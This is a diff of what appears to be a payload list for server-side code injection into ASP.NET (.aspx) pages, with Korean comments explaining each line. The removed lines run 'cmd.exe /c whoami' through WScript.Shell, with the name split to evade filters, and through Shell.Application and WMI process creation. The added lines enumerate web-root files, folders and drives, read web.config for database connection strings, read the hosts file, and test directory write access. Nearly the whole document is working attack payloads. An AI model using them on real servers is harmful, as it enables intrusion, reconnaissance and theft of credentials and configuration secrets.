@@ -1,10 +1,20 @@
-<%= ((dynamic)System.Activator.CreateInstance(System.Type.GetTypeFromProgID("WSc"+"ript.Sh"+"ell"))).Exec("cm"+"d.e"+"xe /c whoami").StdOut.ReadAll() %>
-' Process 클래스 대신 WScript.Shell COM 객체를 동적 인스턴스화하여 whoami 실행 후 결과 출력
-​<%= ((dynamic)System.Activator.CreateInstance(System.Type.GetTypeFromProgID("Shell.Application"))).ShellExecute("cmd.exe", "/c whoami > " + Server.MapPath("s.txt"), "", "open", 0) == null ? "" : System.IO.File.ReadAllText(Server.MapPath("s.txt")) %>
-' Shell.Application COM 객체로 백그라운드 명령 실행 후 파일로 저장된 결과 출력
-​<%= new System.Management.ManagementClass("Win32_Process").InvokeMethod("Create", new object[] { "cmd.exe /c whoami > " + Server.MapPath("w.txt"), null, null, null }) == null ? "" : System.IO.File.ReadAllText(Server.MapPath("w.txt")) %>
-' WMI(Win32_Process) 서비스를 이용해 wmiprvse.exe 하위로 프로세스를 생성하여 실행
-​<%= System.Security.Principal.WindowsIdentity.GetCurrent().Name %>
-' 외부 프로세스 생성 없이 .NET API로 현재 실행 중인 계정명 직접 출력
-​<%= System.Environment.UserDomainName + @"" + System.Environment.UserName %>
-' 외부 프로세스 생성 없이 Environment 내장 클래스에서 도메인 및 사용자 계정명 직접 출력
+<%= System.IO.Directory.GetFiles(Server.MapPath("~")).Length %>
+' 웹 루트 디렉터리의 파일 개수를 출력하여 디렉터리 읽기 권한 확인
+​<%= string.Join(", ", System.IO.Directory.GetFiles(Server.MapPath("~"))) %>
+' 웹 루트 디렉터리에 존재하는 모든 파일 목록을 출력
+​<%= string.Join(", ", System.IO.Directory.GetDirectories(Server.MapPath("~"))) %>
+' 웹 루트 디렉터리 하위의 모든 폴더 목록을 출력
+​<%= string.Join(", ", System.IO.Directory.GetLogicalDrives()) %>
+' 서버에 존재하는 모든 드라이브 문자(C:, D:\ 등) 목록 출력
+​<%= System.IO.File.ReadAllText(Server.MapPath("~/web.config")) %>
+' web.config 파일 전체 내용을 읽어와 DB 연결 문자열 및 주요 설정 정보 확인
+​<%= System.IO.Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)).FullName %>
+' 사용자 프로필 디렉터리 상위 경로를 조회하여 시스템 사용자 계정 목록 확인
+​<%= System.IO.File.ReadAllText(@"C:\Windows\System32\drivers\etc\hosts") %>
+' Windows hosts 파일 내용을 읽어 내부 네트워크 도메인 매핑 정보 확인
+​<%= System.IO.File.Exists(@"C:\Windows\System32\cmd.exe") ? "cmd_exists" : "cmd_not_found" %>
+' cmd.exe 바이너리 존재 여부를 확인하여 파일 접근 제약 유무 검증
+​<%= string.Join(", ", System.IO.Directory.GetFiles(@"C:\Windows\Temp")) %>
+' C:\Windows\Temp 디렉터리의 파일 목록을 읽어 임시 파일 폴더 접근 권한 확인
+​<%= new Action(() => { System.IO.File.WriteAllText(Server.MapPath("test.txt"), "ok"); }) == null ? "" : System.IO.File.ReadAllText(Server.MapPath("test.txt")) %>
+' 웹 디렉터리에 test.txt 임시 파일을 생성 후 읽어와 디렉터리 쓰기 권한 테스트
